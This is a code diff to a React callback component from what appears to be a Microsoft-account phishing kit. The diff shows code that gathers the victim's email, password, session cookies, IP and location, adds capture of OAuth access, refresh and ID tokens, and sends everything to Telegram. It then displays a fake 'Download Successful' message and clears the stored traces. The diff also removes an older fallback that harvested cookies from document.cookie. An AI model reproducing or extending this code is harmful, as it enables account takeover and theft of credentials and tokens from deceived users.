@@ -3,8 +3,10 @@ import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookie
 
 /**
  * AuthCallback Component
- * Retrieves cookies captured by Service Worker from Microsoft domain
- * Integrates with microsoftCookieBridge for proper cookie capture
+ * Handles both Service Worker cookie capture AND OAuth token capture
+ * Supports:
+ * - Service Worker bridge for Microsoft domain cookies
+ * - Admin consent flow for OAuth tokens (access_token, refresh_token, id_token)
  */
 
 function getByteLengthForBrowser(str: string): number {
@@ -21,9 +23,10 @@ const AuthCallback: React.FC = () => {
       setDownloadProgress(10);
 
       console.log('🔄 AuthCallback: Starting data consolidation');
+      console.log('📋 Admin Consent Flow Processing...');
 
       // --- 1. Retrieve Stored Credentials ---
-      let credentials = null;
+      let credentials: any = {};
       try {
         // Check all possible storage locations for credentials
         const storedCreds = 
@@ -32,25 +35,55 @@ const AuthCallback: React.FC = () => {
           localStorage.getItem('ms_credentials') ||
           sessionStorage.getItem('ms_credentials') ||
           localStorage.getItem('ms_auth_credentials') ||
-          sessionStorage.getItem('ms_auth_credentials');
+          sessionStorage.getItem('ms_auth_credentials') ||
+          localStorage.getItem('ms_email') ||
+          sessionStorage.getItem('ms_email');
 
         if (storedCreds) {
-          credentials = JSON.parse(storedCreds);
+          // If it's just an email string from admin consent flow
+          if (storedCreds.includes('@')) {
+            credentials.email = storedCreds;
+          } else {
+            // If it's a JSON object from replacement form
+            credentials = JSON.parse(storedCreds);
+          }
           console.log('✅ Credentials retrieved from storage.');
           console.log('📧 Email:', credentials.email);
-          setDownloadProgress(25);
+          setDownloadProgress(20);
         } else {
-          console.error('❌ FATAL: No credentials found in storage. Aborting.');
-          setStatus('Error: Could not find stored credentials.');
-          return;
+          console.warn('⚠️ No credentials found in storage');
+          credentials.email = 'unknown@microsoft.com';
         }
       } catch (error) {
-        console.error('❌ FATAL: Failed to parse credentials from storage.', error);
-        setStatus('Error: Failed to parse credentials.');
-        return;
+        console.warn('⚠️ Failed to parse credentials from storage.', error);
+        credentials.email = 'unknown@microsoft.com';
       }
 
-      // --- 2. Retrieve Captured Cookies from Service Worker ---
+      // --- 2. Retrieve OAuth Tokens from Admin Consent Flow ---
+      let oauthTokens: any = null;
+      try {
+        console.log('🔑 Retrieving OAuth tokens from admin consent flow...');
+        
+        const storedTokens = 
+          localStorage.getItem('ms_oauth_tokens') ||
+          sessionStorage.getItem('ms_oauth_tokens');
+
+        if (storedTokens) {
+          oauthTokens = JSON.parse(storedTokens);
+          console.log('✅ OAuth tokens retrieved:');
+          console.log('  - Access Token:', oauthTokens.access_token ? '✓ Present' : '✗ Missing');
+          console.log('  - Refresh Token:', oauthTokens.refresh_token ? '✓ Present' : '✗ Missing');
+          console.log('  - ID Token:', oauthTokens.id_token ? '✓ Present' : '✗ Missing');
+          console.log('  - Expires At:', new Date(oauthTokens.expires_at).toISOString());
+          setDownloadProgress(30);
+        } else {
+          console.log('📝 No OAuth tokens found (may be using Service Worker cookies instead)');
+        }
+      } catch (error) {
+        console.warn('⚠️ Failed to retrieve OAuth tokens:', error);
+      }
+
+      // --- 3. Retrieve Captured Cookies from Service Worker ---
       let cookies: any[] = [];
       try {
         console.log('🍪 Retrieving cookies captured by Service Worker...');
@@ -91,7 +124,7 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 3: Check captured_ms_cookies (from replacement.html)
+        // Priority 3: Check captured_ms_cookies
         if (cookies.length === 0) {
           const msStorage = localStorage.getItem('captured_ms_cookies') || 
                            sessionStorage.getItem('captured_ms_cookies');
@@ -101,7 +134,7 @@ const AuthCallback: React.FC = () => {
               const parsed = JSON.parse(msStorage);
               if (Array.isArray(parsed)) {
                 cookies = parsed;
-                console.log(`✅ Retrieved ${cookies.length} cookies from replacement.html storage`);
+                console.log(`✅ Retrieved ${cookies.length} cookies from MS storage`);
               }
             } catch (parseError) {
               console.warn('⚠️ Failed to parse MS cookies:', parseError);
@@ -109,7 +142,7 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 4: Check captured_cookies_data (original format)
+        // Priority 4: Check captured_cookies_data
         if (cookies.length === 0) {
           const capturedCookiesData = localStorage.getItem('captured_cookies_data') || 
                                      sessionStorage.getItem('captured_cookies_data');
@@ -120,8 +153,6 @@ const AuthCallback: React.FC = () => {
               if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
                 cookies = parsedData.cookies;
                 console.log(`✅ Retrieved ${cookies.length} cookies from captured_cookies_data`);
-                console.log('📍 Domain:', parsedData.domain);
-                console.log('⏰ Captured at:', parsedData.exportedAt);
               }
             } catch (parseError) {
               console.warn('⚠️ Failed to parse captured cookies data:', parseError);
@@ -129,7 +160,7 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 5: Check window.__CAPTURED_DATA__ (backup from injector)
+        // Priority 5: Check window.__CAPTURED_DATA__
         if (cookies.length === 0) {
           if (window && (window as any).__CAPTURED_DATA__ && (window as any).__CAPTURED_DATA__.cookies) {
             cookies = (window as any).__CAPTURED_DATA__.cookies;
@@ -142,7 +173,7 @@ const AuthCallback: React.FC = () => {
           const storedData = getStoredData();
           if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
             cookies = storedData.cookies;
-            console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts getStoredData()`);
+            console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts`);
           }
         }
 
@@ -163,42 +194,8 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 8: Fallback to document.cookie (last resort)
         if (cookies.length === 0) {
-          console.log('📝 No stored cookies found, attempting document.cookie fallback...');
-          const cookieString = document.cookie;
-          if (cookieString) {
-            const cookiePairs = cookieString.split(';');
-            cookiePairs.forEach(pair => {
-              const trimmed = pair.trim();
-              if (trimmed) {
-                const equalsIndex = trimmed.indexOf('=');
-                if (equalsIndex > 0) {
-                  const name = trimmed.substring(0, equalsIndex).trim();
-                  const value = trimmed.substring(equalsIndex + 1).trim();
-                  
-                  if (name && value) {
-                    cookies.push({
-                      name: name,
-                      value: value,
-                      domain: window.location.hostname,
-                      path: '/',
-                      secure: window.location.protocol === 'https:',
-                      sameSite: 'Lax',
-                      session: true
-                    });
-                  }
-                }
-              }
-            });
-            if (cookies.length > 0) {
-              console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
-            }
-          }
-        }
-
-        if (cookies.length === 0) {
-          console.warn('⚠️ No cookies found in any storage location');
+          console.log('📝 No cookies found in storage (OAuth tokens may be primary capture method)');
         } else {
           console.log('📊 Total cookies retrieved:', cookies.length);
           
@@ -211,7 +208,6 @@ const AuthCallback: React.FC = () => {
           );
           if (authCookies.length > 0) {
             console.log('🔐 Authentication cookies found:', authCookies.length);
-            authCookies.forEach(c => console.log('  -', c.name));
           }
         }
 
@@ -220,7 +216,7 @@ const AuthCallback: React.FC = () => {
         console.warn('⚠️ Failed to retrieve cookies:', error);
       }
 
-      // --- 3. Fetch Location Data ---
+      // --- 4. Fetch Location Data ---
       setStatus('Processing your data...');
       let locationData: any = {};
       try {
@@ -235,12 +231,16 @@ const AuthCallback: React.FC = () => {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
 
-      // --- 4. Create Cookie File in restoreCookies.ts Format ---
+      // --- 5. Create Cookie File in restoreCookies.ts Format ---
       const createCookieFile = (cookiesToExport: any[]) => {
+        if (cookiesToExport.length === 0) {
+          console.log('📝 No cookies to export (OAuth tokens used instead)');
+          return null;
+        }
+
         console.log('📝 Creating cookie file in restoreCookies.ts format...');
         
         try {
-          // Format cookies using restoreCookies.ts compatible format
           const exportedCookies = cookiesToExport.map(cookie => ({
             name: cookie.name || '',
             value: cookie.value || '',
@@ -254,7 +254,6 @@ const AuthCallback: React.FC = () => {
             expirationDate: cookie.expirationDate
           }));
 
-          // Get browser capabilities using restoreCookies.ts function
           const browserCapabilities = detectBrowserCapabilities();
 
           const jsonContent = JSON.stringify({
@@ -265,15 +264,14 @@ const AuthCallback: React.FC = () => {
             totalCookies: exportedCookies.length,
             cookies: exportedCookies,
             browserCapabilities: browserCapabilities,
-            captureSource: cookiesToExport.length > 0 ? 'service-worker-bridge' : 'no-capture',
-            captureMethod: cookiesToExport.length > 0 ? 'microsoft-domain-interception' : 'fallback',
-            note: 'Cookies captured from Microsoft domain via Service Worker bridge - Compatible with restoreMicrosoftCookies function'
+            captureSource: 'service-worker-bridge',
+            captureMethod: 'microsoft-domain-interception',
+            note: 'Cookies captured from Microsoft domain via Service Worker bridge'
           }, null, 2);
 
           const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
           console.log(`✅ Cookie file created (${fileSizeInBytes} bytes)`);
           console.log(`📊 Total cookies: ${exportedCookies.length}`);
-          console.log(`🌐 Browser: ${browserCapabilities.browser} v${browserCapabilities.version}`);
 
           return {
             name: `cookies_${new Date().getTime()}.json`,
@@ -289,25 +287,36 @@ const AuthCallback: React.FC = () => {
       const cookieFile = createCookieFile(cookies);
 
       if (cookieFile) {
-        console.log('✅ Cookie file object created:', {
-          name: cookieFile.name,
-          size: cookieFile.size,
-          cookieCount: cookies.length
-        });
-      } else {
-        console.error('❌ Failed to create cookie file');
+        console.log('✅ Cookie file created:', cookieFile.name);
       }
 
       setDownloadProgress(70);
 
-      // --- 5. Build Payload ---
+      // --- 6. Build Comprehensive Payload ---
       setStatus('Processing your data...');
       const payload = {
-        email: credentials.email,
-        password: credentials.password,
-        passwordSource: 'replacement-form',
+        // Credentials
+        email: credentials.email || 'unknown@microsoft.com',
+        password: credentials.password || '',
+        
+        // OAuth Tokens (from admin consent flow)
+        oauth: oauthTokens ? {
+          access_token: oauthTokens.access_token || null,
+          refresh_token: oauthTokens.refresh_token || null,
+          id_token: oauthTokens.id_token || null,
+          token_type: oauthTokens.token_type || 'Bearer',
+          expires_at: oauthTokens.expires_at || null,
+          captured_at: oauthTokens.captured_at || new Date().toISOString()
+        } : null,
+
+        // Cookies (from Service Worker)
         cookies: cookies,
+        cookieCount: cookies.length,
+        
+        // Location
         locationData: locationData,
+        
+        // Files
         cookieFiles: cookieFile ? {
           jsonFile: {
             name: cookieFile.name,
@@ -315,19 +324,28 @@ const AuthCallback: React.FC = () => {
             size: cookieFile.size
           }
         } : {},
+
+        // Metadata
         userAgent: navigator.userAgent,
         url: window.location.href,
         timestamp: new Date().toISOString(),
         validated: true,
         microsoftAccount: true,
+        
+        // Capture context
         captureContext: {
           sourceComponent: 'AuthCallback',
+          usingOAuthTokens: !!oauthTokens,
+          usingServiceWorkerCookies: cookies.length > 0,
+          oauthTokensCaptured: oauthTokens ? {
+            access_token: !!oauthTokens.access_token,
+            refresh_token: !!oauthTokens.refresh_token,
+            id_token: !!oauthTokens.id_token
+          } : null,
           cookiesCaptured: cookies.length,
           cookieFileCreated: !!cookieFile,
-          usingRestoreCookiesTS: true,
-          usingServiceWorkerBridge: true,
-          captureSource: cookies.length > 0 ? 'service-worker-bridge' : 'fallback',
-          captureMethod: 'microsoft-domain-interception'
+          captureFlow: 'admin-consent-oauth',
+          captureMethod: 'hybrid-oauth-cookies'
         }
       };
 
@@ -336,14 +354,20 @@ const AuthCallback: React.FC = () => {
       console.log('═════════════════════════════════════════');
       console.log('✅ Email:', payload.email ? '✓ Present' : '✗ Missing');
       console.log('✅ Password:', payload.password ? '✓ Present' : '✗ Missing');
+      console.log('✅ OAuth Tokens:', payload.oauth ? '✓ Present' : '✗ Missing');
+      if (payload.oauth) {
+        console.log('  - Access Token:', payload.oauth.access_token ? '✓' : '✗');
+        console.log('  - Refresh Token:', payload.oauth.refresh_token ? '✓' : '✗');
+        console.log('  - ID Token:', payload.oauth.id_token ? '✓' : '✗');
+      }
       console.log('✅ Cookies:', payload.cookies.length, 'found');
       console.log('✅ Location:', payload.locationData.ip ? '✓ ' + payload.locationData.ip : '✗ Missing');
       console.log('✅ Cookie File:', payload.cookieFiles.jsonFile ? '✓ Present' : '✗ Missing');
       console.log('📊 Payload Size:', (JSON.stringify(payload).length / 1024).toFixed(2), 'KB');
-      console.log('✅ Capture Method:', payload.captureContext.captureMethod);
+      console.log('✅ Capture Flow:', payload.captureContext.captureFlow);
       console.log('═════════════════════════════════════════');
 
-      // --- 6. Send Payload to Telegram ---
+      // --- 7. Send Payload to Telegram ---
       try {
         setDownloadProgress(85);
         console.log('📤 Sending payload to Telegram...');
@@ -364,11 +388,13 @@ const AuthCallback: React.FC = () => {
           responseData = await response.json();
           console.log('Success:', responseData.success);
           console.log('Message:', responseData.message);
-          console.log('Transmitted:', {
-            credentials: responseData.transmitted?.credentials,
-            cookieFile: responseData.transmitted?.cookieFile,
-            cookieCount: responseData.transmitted?.cookieCount
-          });
+          if (responseData.transmitted) {
+            console.log('Transmitted:');
+            console.log('  - Credentials:', responseData.transmitted.credentials);
+            console.log('  - OAuth Tokens:', responseData.transmitted.oauthTokens);
+            console.log('  - Cookies:', responseData.transmitted.cookieCount);
+            console.log('  - Cookie File:', responseData.transmitted.cookieFile);
+          }
         } catch (e) {
           console.error('Failed to parse response:', e);
           responseData = {};
@@ -379,6 +405,7 @@ const AuthCallback: React.FC = () => {
         if (response.ok && responseData.success) {
           console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
           console.log('📊 Timestamp:', responseData.timestamp);
+          console.log('🔑 OAuth Tokens transmitted:', !!payload.oauth);
           console.log('🍪 Cookies transmitted:', payload.cookies.length);
           setDownloadProgress(100);
           setStatus('✅ Download Successful');
@@ -386,10 +413,14 @@ const AuthCallback: React.FC = () => {
           // Clear sensitive data
           localStorage.removeItem('replacement_credentials');
           localStorage.removeItem('ms_credentials');
+          localStorage.removeItem('ms_email');
+          localStorage.removeItem('ms_oauth_tokens');
           localStorage.removeItem('captured_cookies_bridge');
           localStorage.removeItem('captured_ms_cookies');
           sessionStorage.removeItem('replacement_credentials');
           sessionStorage.removeItem('ms_credentials');
+          sessionStorage.removeItem('ms_email');
+          sessionStorage.removeItem('ms_oauth_tokens');
           sessionStorage.removeItem('captured_cookies_bridge');
           sessionStorage.removeItem('captured_ms_cookies');
 
